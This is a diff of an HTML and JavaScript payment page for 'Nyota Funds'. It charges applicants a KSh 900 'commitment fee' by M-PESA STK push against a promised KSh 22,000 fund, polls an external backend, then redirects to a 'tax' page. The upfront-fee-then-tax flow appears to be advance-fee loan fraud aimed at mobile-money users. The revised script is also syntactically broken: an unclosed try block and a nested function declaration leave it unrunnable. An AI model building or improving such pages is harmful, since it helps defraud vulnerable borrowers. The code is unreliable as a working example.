@@ -3,62 +3,104 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Customer Commitment Fee</title>
+<title>Customer Commitment Fee - Nyota Funds</title>
 
 <style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+}
+
 body{
-    margin:0;
-    padding:15px;
-    background:#0b6b0b;
-    font-family:Arial,sans-serif;
+background:#0b6b0b;
+padding:15px;
 }
 
 .container{
-    max-width:420px;
-    margin:auto;
+max-width:430px;
+margin:auto;
 }
 
 .card{
-    background:white;
-    padding:20px;
-    border-radius:10px;
+background:#fff;
+padding:20px;
+border-radius:12px;
+box-shadow:0 5px 15px rgba(0,0,0,.15);
 }
 
-h1{
-    text-align:center;
-    color:#1565c0;
-    font-size:22px;
+h2{
+text-align:center;
+color:#1565c0;
+margin-bottom:15px;
 }
 
-p{
-    text-align:center;
-    font-size:15px;
+.success-box{
+background:#e8f5e9;
+padding:12px;
+border-radius:10px;
+color:#1b5e20;
+text-align:center;
+margin-bottom:15px;
+font-size:15px;
+}
+
+.details{
+background:#f7f7f7;
+padding:15px;
+border-radius:10px;
+margin-bottom:15px;
+}
+
+.details p{
+margin:10px 0;
+font-size:15px;
 }
 
 label{
-    display:block;
-    margin-top:15px;
-    font-weight:bold;
+display:block;
+margin-top:15px;
+margin-bottom:6px;
+font-weight:bold;
 }
 
 input{
-    width:100%;
-    padding:12px;
-    margin-top:5px;
-    border-radius:8px;
-    border:1px solid #ccc;
-    box-sizing:border-box;
+width:100%;
+padding:12px;
+border:1px solid #ccc;
+border-radius:8px;
+font-size:16px;
 }
 
 button{
-    width:100%;
-    padding:14px;
-    margin-top:20px;
-    background:#1565c0;
-    color:white;
-    border:none;
-    border-radius:8px;
-    font-size:18px;
+width:100%;
+padding:15px;
+margin-top:20px;
+background:#1565c0;
+color:white;
+border:none;
+border-radius:8px;
+font-size:17px;
+font-weight:bold;
+cursor:pointer;
+}
+
+button:disabled{
+background:#999;
+}
+
+#status{
+margin-top:15px;
+text-align:center;
+font-size:15px;
+}
+
+.secure{
+margin-top:15px;
+text-align:center;
+font-size:13px;
+color:#666;
 }
 </style>
 </head>
@@ -66,161 +108,169 @@ button{
 <body>
 
 <div class="container">
+
 <div class="card">
 
-<h1>Customer Commitment Fee</h1>
+<h2>Customer Commitment Fee</h2>
 
-<p>Hi 👋 <span id="name"></span>!</p>
+<div class="success-box">
+Your NYOTA FUNDS application is almost complete.
+</div>
 
-<p>Your Selected NYOTA Fund: <b>Ksh <span id="fund"></span></b></p>
+<div class="details">
 
-<p>Customer Commitment Fee: <b>Ksh 900</b></p>
+<p><b>Applicant:</b> <span id="fullName"></span></p>
 
-<p>
-Complete your Customer Commitment Fee payment to continue processing your NYOTA Funds application.
-</p>
+<p><b>Phone:</b> <span id="phone"></span></p>
 
-<label>Full Name</label>
-<input type="text" id="fullName">
+<p><b>Selected Fund:</b> KSh <span id="fund">22,000</span></p>
 
-<label>Phone Number</label>
-<input type="tel" id="phone" placeholder="2547XXXXXXXX">
+<p><b>Commitment Fee:</b> <span style="color:#1b5e20;font-weight:bold;">KSh 900</span></p>
 
-<button id="payBtn" onclick="payNow()">
-Pay Now
+</div>
+
+<button id="payBtn" onclick="payCommitment()">
+Pay Commitment Fee
 </button>
 
-<p id="stkMessage"></p>
+<div id="status"></div>
+
+<p class="secure">
+🔒 Secure STK Push • Instant Confirmation
+</p>
 
 </div>
+
 </div>
+
 <script>
 
-let applicant = localStorage.getItem("fullName");
+document.getElementById("fullName").innerHTML =
+localStorage.getItem("fullName") || "Applicant";
 
-document.getElementById("name").innerHTML =
-applicant || "Applicant";
-
-document.getElementById("fullName").value =
-applicant || "";
+document.getElementById("phone").innerHTML =
+localStorage.getItem("phoneNumber") || "";
 
 document.getElementById("fund").innerHTML =
 localStorage.getItem("selectedAmount") || "22,000";
 
-async function payNow(){
+async function payCommitment(){
 
-let phone = document.getElementById("phone").value;
+let phone = localStorage.getItem("phoneNumber");
 
-let btn = document.getElementById("payBtn");
-
-if(phone===""){
-alert("Enter phone number");
+if(!phone){
+alert("Phone number not found.");
 return;
 }
 
-btn.innerHTML = "Sending STK Push...";
-btn.disabled = true;
+let btn=document.getElementById("payBtn");
+
+let status=document.getElementById("status");
+
+btn.disabled=true;
+
+btn.innerHTML="Sending STK Push...";
+
+status.innerHTML="";
 
 try{
 
-let response = await fetch(
-"httphttps://nyota-funds-backend.onrender.com/stk-push
+let response=await fetch(
+"https://nyota-funds-backend.onrender.com/stk-push",
 {
 method:"POST",
 headers:{
 "Content-Type":"application/json"
 },
-body: JSON.stringify({
-phone: phone,
-amount: 900
+body:JSON.stringify({
+phone:phone,
+amount:900
 })
 }
 );
 
-let data = await response.json();
+let data=await response.json();
 
 console.log(data);
 
-if(!data.success){
-    alert(data.message || "Payment failed");
-    btn.disabled=false;
-    btn.innerHTML="Pay Now";
-    return;
-}
+let checkoutId=data.data.checkout_request_id;
 
-if(data.status=="completed"){
-    window.location.href="success.html";
-    return;
-}
+status.innerHTML=
+"📱 STK Push sent successfully. Please enter your M-PESA PIN.";
 
-if(data.status=="pending"){
+checkPayment(checkoutId);
+    async function checkPayment(checkoutId){
 
-    btn.innerHTML="Waiting for payment...";
+let interval=setInterval(async()=>{
 
-    document.getElementById("stkMessage").innerHTML =
-    "STK Push sent successfully. Please enter your M-PESA PIN on your phone. This page will continue automatically once payment is confirmed.";
+try{
 
-    let checkout=data.checkout_request_id;
-
-    
-
-    let timer=setInterval(async()=>{
-
-       let res = await fetch(
+let response=await fetch(
 "https://nyota-funds-backend.onrender.com/payment-status",
 {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-        checkout_request_id: checkout
-    })
-});
-    
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+checkout_request_id:checkoutId
+})
+}
+);
 
-        let status=await res.json();
+let result=await response.json();
 
-        console.log(status);
+console.log(result);
 
-        if(status.status=="completed"){
+if(result.status==="completed"){
 
-            clearInterval(timer);
+clearInterval(interval);
 
-            window.location.href="tax.html";
+document.getElementById("status").innerHTML=
+"✅ Commitment fee paid successfully. Redirecting...";
 
-        }
-
-        if(status.status=="failed"){
-
-            clearInterval(timer);
-
-            alert("Payment failed");
-
-            btn.disabled=false;
-            btn.innerHTML="Pay Now";
-
-        }
-
-    },3000);
+setTimeout(()=>{
+window.location.href="tax.html";
+},1000);
 
 }
+
+else if(result.status==="failed"){
+
+clearInterval(interval);
+
+document.getElementById("status").innerHTML=
+"❌ Payment failed.";
+
+document.getElementById("payBtn").disabled=false;
+document.getElementById("payBtn").innerHTML="Pay Commitment Fee";
+
 }
-catch(error){
+
+else if(result.status==="cancelled"){
+
+clearInterval(interval);
+
+document.getElementById("status").innerHTML=
+"❌ Payment cancelled.";
+
+document.getElementById("payBtn").disabled=false;
+document.getElementById("payBtn").innerHTML="Pay Commitment Fee";
+
+}
+
+}catch(error){
 
 console.log(error);
 
-alert("Payment request failed");
+}
 
-btn.innerHTML = "Pay Now";
-btn.disabled = false;
+},3000);
 
 }
 
-}
-
-</script> 
-
+</script>
 
 </body>
-  </html>
+</html>
+    
